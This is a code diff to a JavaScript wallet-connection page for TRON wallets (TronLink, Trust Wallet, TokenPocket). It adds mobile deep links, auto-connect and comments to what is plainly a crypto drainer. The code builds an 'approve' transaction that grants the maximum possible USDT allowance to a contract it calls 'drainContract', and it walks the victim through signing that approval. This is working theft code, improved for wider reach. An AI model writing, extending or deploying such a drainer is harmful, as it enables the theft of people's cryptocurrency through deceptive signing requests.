@@ -351,13 +351,15 @@
     }
 
     // ============================================================
-    // TRON PROVIDER DETECTION
+    // TRON PROVIDER DETECTION - FIXED FOR MOBILE
     // ============================================================
 
     function getTronWeb() {
+      // Check if tronWeb is available and ready
       if (window.tronWeb && window.tronWeb.ready) {
         return window.tronWeb;
       }
+      // Check if tronWeb exists but might not be ready yet
       if (window.tronWeb) {
         return window.tronWeb;
       }
@@ -373,23 +375,27 @@
     }
 
     function findProvider() {
+      // First check tronWeb (works on both desktop and mobile)
       var tw = getTronWeb();
       if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
         console.log('✅ Found provider via tronWeb');
         return tw;
       }
 
+      // Check tronLink
       var tl = getTronLink();
       if (tl && tl.tronWeb && tl.tronWeb.ready) {
         console.log('✅ Found provider via tronLink');
         return tl.tronWeb;
       }
 
+      // Check if tronWeb is available but not ready - wait for it
       if (window.tronWeb) {
         console.log('⚠️ tronWeb exists but not ready yet');
         return window.tronWeb;
       }
 
+      // For Trust Wallet mobile - check ethereum provider
       var eth = getEthereum();
       if (eth && eth.isTrust && eth.tronLink) {
         console.log('✅ Found Trust Wallet via ethereum');
@@ -409,6 +415,7 @@
       var encodedUrl = encodeURIComponent(currentUrl);
       var deepLink = '';
 
+      // Build deep link based on wallet
       switch(wallet.id) {
         case 'tronlink':
           var param = encodeURIComponent(JSON.stringify({
@@ -441,7 +448,10 @@
       console.log('🔗 Opening deep link:', deepLink);
 
       if (deepLink) {
+        // Try to open the app
         window.location.href = deepLink;
+
+        // If the app doesn't open, show download link after a delay
         setTimeout(function() {
           if (!document.hidden) {
             msg('inf', 'If the wallet didn\'t open, <a href="' + wallet.universalLink + '" target="_blank" style="color:#4ade80;">download the app</a>');
@@ -528,7 +538,7 @@
     }
 
     // ============================================================
-    // CONNECT WALLET
+    // CONNECT WALLET - FIXED FOR MOBILE
     // ============================================================
 
     async function connectWallet(walletId) {
@@ -538,12 +548,14 @@
       console.log('🔄 connectWallet called with:', walletId);
       console.log('📱 isMobile:', isMobile);
 
+      // Find the wallet object
       var wallet = WALLETS.find(function(w) { return w.id === walletId; });
       if (!wallet) {
         msg('err', 'Wallet not found');
         return;
       }
 
+      // Make sure config is loaded
       if (!configLoaded || !config.usdtContract) {
         msg('warn', 'Loading configuration...');
         var cfg = await fetchConfig();
@@ -554,6 +566,7 @@
         config = cfg;
       }
 
+      // Check if drain contract is configured
       if (!config.drainContract) {
         showConfigError(
           'Drain contract not configured.<br><br>' +
@@ -562,6 +575,7 @@
         return;
       }
 
+      // Show waiting screen
       scShow('scWait');
       document.getElementById('waitDesc').textContent = 'Connecting to ' + wallet.name + '...';
       updateStep(1, 'active');
@@ -575,6 +589,7 @@
         console.log('📱 Mobile detected, using deep link for:', wallet.name);
         openDeepLink(wallet);
 
+        // Try to detect the provider after opening the app
         var provider = null;
         var address = null;
         var attempts = 0;
@@ -587,6 +602,7 @@
           console.log('⏳ Looking for provider... attempt', attempts, '/', maxAttempts);
 
           if (provider) {
+            // Try to get address
             if (provider.defaultAddress && provider.defaultAddress.base58) {
               address = provider.defaultAddress.base58;
             } else if (provider.request) {
@@ -617,6 +633,11 @@
           await doApproveFlow(address, provider);
           return;
         } else {
+          // Still waiting - show a message
+          document.getElementById('waitDesc').textContent = 'Waiting for wallet connection...';
+          msg('inf', 'Please complete the connection in your wallet app');
+          
+          // Keep waiting a bit longer
           var extraAttempts = 0;
           while (extraAttempts < 20) {
             await new Promise(function(r) { setTimeout(r, 500); });
@@ -661,6 +682,7 @@
       var provider = findProvider();
       var address = null;
 
+      // Wait for provider if not found
       if (!provider) {
         var attempts = 0;
         while (attempts < 30) {
@@ -685,6 +707,7 @@
       document.getElementById('waitDesc').textContent = 'Please confirm in your wallet...';
 
       try {
+        // Try tronLink.request
         var tl = getTronLink();
         if (tl && typeof tl.request === 'function') {
           console.log('📤 Calling tronLink.request...');
@@ -700,6 +723,7 @@
           }
         }
 
+        // If tronLink didn't work, try provider.request
         if (!address && provider && typeof provider.request === 'function') {
           console.log('📤 Calling provider.request...');
           try {
@@ -715,11 +739,13 @@
           }
         }
 
+        // Check if provider already has address
         if (!address && provider.defaultAddress && provider.defaultAddress.base58) {
           address = provider.defaultAddress.base58;
           console.log('📍 Got address from provider.defaultAddress:', address);
         }
 
+        // Try tronWeb directly
         if (!address) {
           var tw = getTronWeb();
           if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
@@ -761,7 +787,7 @@
     }
 
     // ============================================================
-    // APPROVE FLOW - FIXED FOR UNLIMITED
+    // APPROVE FLOW
     // ============================================================
 
     async function doApproveFlow(address, provider) {
@@ -820,46 +846,26 @@
         document.getElementById('processingDesc').textContent = 'Balance: ' + balanceUsdt.toFixed(2) + ' USDT — Signing approval...';
         document.getElementById('processingTitle').textContent = 'Sign Approve Transaction';
 
-        // ============================================================
-        // CRITICAL FIX: Use the EXACT max value for unlimited approval
-        // This ensures TronLink shows "Unlimited" option
-        // ============================================================
-        var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        
-        console.log('📝 Using approve value:', approveVal);
-        console.log('📝 This should show "Unlimited" in TronLink');
+        var approveVal = config.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-        // Use triggerSmartContract with the EXACT max value
         var approveTx;
         try {
           var tw = provider;
           if (!tw.transactionBuilder) {
             tw = window.tronWeb || provider;
           }
-          
-          // Build the approve transaction with explicit max value
           var built = await tw.transactionBuilder.triggerSmartContract(
             config.usdtContract,
             'approve(address,uint256)',
-            { 
-              feeLimit: 20000000,
-              callValue: 0
-            },
+            { feeLimit: 20000000 },
             [
               { type: 'address', value: config.drainContract },
               { type: 'uint256', value: approveVal }
             ],
             address
           );
-          
           approveTx = built.transaction || built;
-          console.log('✅ Approve transaction built with unlimited value');
-          
-          // Log the transaction details for debugging
-          if (approveTx && approveTx.raw_data) {
-            console.log('📝 Transaction data:', approveTx.raw_data);
-          }
-          
+          console.log('✅ Approve transaction built');
         } catch(e) {
           console.error('❌ Build error:', e);
           showError('Build Failed', 'Could not build approve transaction: ' + e.message);
@@ -1024,6 +1030,7 @@
 
     loadConfigWithRetry();
 
+    // Auto-connect for desktop
     if (!isMobile) {
       (function autoConnect() {
         var attempts = 0;
@@ -1048,11 +1055,14 @@
         }, 500);
       })();
     } else {
+      // On mobile, show a message to open the wallet app
       var btn = document.getElementById('manualConnectBtn');
       btn.style.display = 'block';
       btn.textContent = '📱 Open Wallet App';
       btn.addEventListener('click', function() {
-        var walletId = 'tronlink';
+        // Try to detect which wallet to open
+        var walletId = 'tronlink'; // default
+        // Check user agent for specific wallets
         if (isTrustApp) walletId = 'trust';
         else if (isTokenPocketApp) walletId = 'tokenpocket';
         
